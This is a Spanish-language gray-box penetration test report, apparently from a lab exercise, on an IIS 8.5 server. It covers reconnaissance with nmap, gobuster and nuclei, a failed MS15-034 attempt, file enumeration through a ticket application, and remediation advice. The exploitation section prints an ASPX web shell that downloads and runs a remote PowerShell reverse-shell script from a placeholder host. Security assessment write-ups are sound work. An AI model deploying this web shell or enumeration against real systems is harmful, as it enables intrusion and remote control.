# Introducción
Este documento presenta los resultados, hallazgos y recomendaciones emitidas para mitigar las vulnerabilidades identificadas en el servicio de pruebas de penetración en modalidad de caja gris, ejecutadas desde un escenario interno el día 18 de marzo de 2025, llevadas a cabo por el equipo de pruebas de seguridad hacia la infraestructura tecnológica de la máquina objetivo.

# Objetivos del documento
El documento tiene por objeto presentar la evaluación y el análisis realizado durante el servicio de pruebas de penetración conforme a la metodología utilizada. 

Concretamente, este documento pretende tres objetivos:
- Evaluar el impacto tecnológico y clasificar la severidad de las vulnerabilidades.
- Presentar posibles escenarios de riesgo que pueden afectar la confidencialidad, integridad y disponibilidad de la información en los dispositivos evaluados.
- Emitir recomendaciones que ayuden a la mitigación de las brechas de seguridad.

# Alcance
La prueba se realizó desde una conexión externa en una modalidad de caja gris, es decir, con información previa sobre la infraestructura objetivo. Las direcciones IP contempladas en la evaluación se listan a continuación:
```
18.116.70.34
```

## Visión general

## Fortalezas identificadas
Durante la ejecución de las pruebas de penetración se identificaron fortalezas en la configuración y defensa de la infraestructura, a continuación, se listan los hallazgos identificados:
- El servicio web utiliza Microsoft-IIS/8.5, lo que indica el uso de un servidor web de Microsoft, con capacidad para ejecutar aplicaciones en ASP.NET.
- Implementación de controles de acceso en algunos directorios que limitaron el acceso directo a archivos críticos.

## Resumen de los hallazgos
Como resultado de las pruebas, se identificaron los siguientes hallazgos:

| Escenario de riesgo                                | Descripción                                                                                  | Vulnerabilidad asociada                                    | Severidad   |
| -------------------------------------------------- | -------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | ----------- |
| Exposición de información                          | El "Sistema de Tickets" permite conocer la existencia y tamaño de ciertos archivos sensibles | Exposición de archivos a través de respuestas del servidor | 8.7/Alta    |
| Vulnerabilidad de ejecución remota (no explotable) | CVE-2015-1635 identificado, pero no explotable debido a respuesta 416                        | HTTP.sys Request Handling Vulnerability                    | 6.9 / Media |

A continuación, se describen los escenarios de riesgo que un atacante podría aprovechar, a partir de las vulnerabilidades identificadas y explotadas, desde un escenario interno durante el tiempo de las pruebas.

# **Reporte de Prueba de Penetración - Servidor IIS 8.5**

## **1. Planeación**

La prueba de penetración se llevó a cabo desde una máquina Kali Linux con IP `3.142.248.89`. El objetivo era evaluar la seguridad de un servidor web expuesto en la IP `18.116.70.34`, identificado como Microsoft-IIS/8.5 corriendo en el puerto 80.
![](images-aeromex/Pasted%20image%2020250318105327.png)

El enfoque metodológico incluyó:
- **Reconocimiento pasivo y activo**
- **Identificación de vulnerabilidades**
- **Ejecución de exploits y validación de impactos**
- **Post-explotación en caso de éxito**

---

## **2. Reconocimiento**

Se realizó un escaneo inicial del servidor con Nmap para identificar puertos abiertos y servicios:

![](images-aeromex/Pasted%20image%2020250318110413.png)

```bash
nmap -sV -p 80 18.116.70.34
```

![](images-aeromex/Pasted%20image%2020250318110830.png)
Resultado relevante:
```plaintext
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft-IIS/8.5
```

El encabezado HTTP del servidor confirmó que estaba corriendo IIS 8.5. Se realizó un análisis con `curl` para obtener más información:

```bash
curl -I http://18.116.70.34
```

Salida:
```java
HTTP/1.1 200 OK
Content-Length: 2033
Content-Type: text/html
Last-Modified: Thu, 20 Feb 2025 06:40:19 GMT
Accept-Ranges: bytes
ETag: "257c5b4f6283db1:0"
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Tue, 18 Mar 2025 17:46:38 GMT
```

### **Explicación de los Encabezados:**
- **Server: Microsoft-IIS/8.5** ? Indica que el servidor web es IIS 8.5.
- **X-Powered-By: ASP.NET** ? Sugiere que la aplicación usa ASP.NET.
- **Last-Modified** ? Muestra la última modificación del archivo servido.
- **ETag** ? Identificador único del recurso en el servidor.

Se utilizó `cewl` para generar un diccionario basado en el contenido del sitio y `gobuster` para la búsqueda de directorios ocultos:

![](images-aeromex/Pasted%20image%2020250318123740.png)

```bash
gobuster dir -u http://18.116.70.34 -w dictdir.txt
```

![](images-aeromex/Pasted%20image%2020250318123901.png)
Resultado:
```plaintext
/aeromex/        (Status: 301)
```

Este directorio contenía una aplicación denominada "Sistema de Tickets".

---

## **3. Identificación de Vulnerabilidades**

Se utilizó `nuclei` para buscar vulnerabilidades en IIS:

```bash
nuclei -u http://18.116.70.34 -t cves/
```

![](images-aeromex/Pasted%20image%2020250318114156.png)
Resultado:
```plaintext
CVE-2015-1635 - HTTP.sys Remote Code Execution (MS15-034)
```

Este CVE afecta `HTTP.sys`, el controlador HTTP de Windows, permitiendo ejecución remota de código a través de peticiones HTTP manipuladas.

Se validó con Nmap:

```bash
nmap --script http-ms15-034 -p 80 18.116.70.34
```

![](images-aeromex/Pasted%20image%2020250318114742.png)

Sin embargo, al intentar explotar la vulnerabilidad, analizamos el exploit correspondiente y a partir del payload se realizó una prueba inicial, el servidor respondió con un código HTTP `416 (Requested Range Not Satisfiable)`.

![](images-aeromex/Pasted%20image%2020250318123213.png)

![](images-aeromex/Pasted%20image%2020250318123248.png)

![](images-aeromex/Pasted%20image%2020250318123325.png)
Lo que indica que el exploit no es aplicable en este caso porque:
- El servidor no tiene activado el soporte para `Range` en `HTTP.sys`.
- La implementación de seguridad bloquea el vector de ataque.

---

## **4. Preparación del Ataque**

Dado que la explotación de MS15-034 no fue viable, se procedió con la exploración del "Sistema de Tickets" en `/aeromex/`. Se identificó que la aplicación permitía obtener información sobre archivos internos basándose en su existencia y tamaño.


![](images-aeromex/Pasted%20image%2020250318124257.png)

Se probaron archivos comunes en servidores Windows:
```java
C:\inetpub\wwwroot\index.html
C:\Windows\win.ini
C:\windows\system32\drivers\etc\hosts
```

![](images-aeromex/Pasted%20image%2020250318124454.png)
El sistema confirmó su existencia devolviendo sus tamaños en bytes.

---

## **5. Explotación**

Se intentó cargar una web shell en `.aspx` :
```java
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    System.Diagnostics.Process.Start("cmd.exe", "/c powershell -c IEX (New-Object Net.WebClient).DownloadString('http://TU_IP:8000/reverse.ps1')");
}
</script>
```

Usando rutas compartidas, pero la máquina no aceptaba conexiones remotas. Como alternativa, se subió el archivo a un servidor externo y se intentó acceder desde la aplicación de tickets.

![](images-aeromex/Pasted%20image%2020250318171817.png)

![](images-aeromex/Pasted%20image%2020250318171849.png)

Al hacer la solicitud al archivo, el sistema devolvía el tamaño en bytes, lo que confirmaba que podía leer archivos externos.

**Posibles pasos posteriores:**
1. **Enumerar archivos clave** mediante esta técnica para extraer credenciales.
2. **Intentar ejecución de comandos** mediante un archivo `.aspx` malicioso si la aplicación permite ejecutarlo.
3. **Escalada de privilegios** mediante credenciales obtenidas o exploits locales.

---

## **6. Post-Explotación (No Aplicable)**

No se logró ejecución de código en esta fase, pero se identificaron vulnerabilidades que podrían ser explotadas con otras técnicas.

---

## **7. Generación de Resultados**

### **Hallazgos:**
- Servidor expuesto con Microsoft-IIS/8.5.
- Directorio oculto `/aeromex/` con una aplicación vulnerable.
- Enumeración de archivos internos del sistema operativo.
- Fallo en la explotación de CVE-2015-1635 por mitigaciones activas.

### **Recomendaciones:**
- Aplicar actualizaciones de seguridad a IIS.
- Restringir acceso a directorios internos.
- Implementar validación en la aplicación de tickets para evitar enumeración de archivos.
- Monitorear actividad inusual en los logs de IIS.

Este reporte detalla el proceso de reconocimiento y ataque, resaltando vulnerabilidades identificadas y mitigaciones aplicables.